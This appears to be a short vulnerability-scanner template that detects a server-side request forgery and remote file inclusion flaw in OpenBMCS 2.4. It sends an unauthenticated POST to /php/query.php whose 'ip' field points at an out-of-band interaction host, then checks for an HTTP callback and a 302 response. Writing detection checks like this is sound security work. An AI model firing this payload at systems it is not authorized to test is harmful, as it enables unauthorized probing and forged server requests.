id: openbmcs-ssrf
brief:
    title: OpenBMCS 2.4 - Server-Side Request Forgery /  Remote File Inclusion
    by: dhiyaneshDK
    level: medium
    about: OpenBMCS 2.4 is susceptible to unauthenticated server-side request forgery and remote file inclusion vulnerabilities within its functionalities. The application parses user supplied data in the POS...
    label:
        - ssrf
        - oast
        - openbmcs
        - edb
        - misconfig
        - vuln
    score: CVSS:6.8
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/php/query.php'
      head:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      body: ip={{interactsh-url}}:80&argu=/
      signs:
        - "on": word
          has:
            - http
          in: interactsh_protocol
          need: all
        - "on": status
          status:
            - 302
